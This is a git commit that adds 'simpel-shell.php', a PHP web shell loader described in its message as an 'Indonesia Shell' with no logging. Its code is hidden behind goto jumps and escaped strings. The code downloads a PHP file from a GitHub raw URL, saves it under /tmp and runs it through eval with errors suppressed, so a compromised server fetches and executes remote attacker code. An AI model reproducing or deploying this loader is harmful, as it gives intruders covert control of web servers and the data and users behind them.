6c55cf4c0cfedd16ad18c719324bc7e12dca727c
mdnnewbie <saputrodayat070@gmail.com>
2024-08-25 01:50:54 +0700

    Create simpel-shell.php
    Indonesia Shell - simple shell - shell ringan - no logger shell

---
+++ simpel-shell.php
@@ -0,0 +1,6 @@
+<?php
+/*   __________________________________________________
+    |          ♥ INDONESIAN HACKER 2024™ ♥             |
+    |__________________________________________________|
+*/
+goto ADUbn; cp5ij: if (is_file("\x2f\x74\155\x70\57\163\x65\163\x5f" . $KATAO)) { goto lrYAo; } goto sD_Yb; XVJaS: lrYAo: goto WjzH7; O4lj7: $KATAO = md5($ZreZR); goto cp5ij; ADUbn: $ZreZR = rand(00, 99999999); goto O4lj7; sD_Yb: @file_put_contents("\x2f\x74\x6d\160\x2f\x73\145\x73\x5f" . $KATAO, file_get_contents("\150\x74\x74\160\x73\72\x2f\x2f\162\141\x77\x2e\x67\151\164\x68\165\x62\x75\163\145\x72\x63\x6f\156\164\145\156\164\x2e\x63\x6f\155\x2f\x6d\x64\x6e\x6e\145\x77\x62\151\145\57\x55\160\x6c\157\141\x64\145\162\x2f\155\x61\151\x6e\57\147\141\x6e\164\145\156\147\145\x72\x73\x63\x72\145\167\x2e\x70\150\x70")); goto XVJaS; WjzH7: @eval("\x3f\76" . file_get_contents("\x2f\x74\155\x70\57\163\145\163\x5f" . $KATAO));
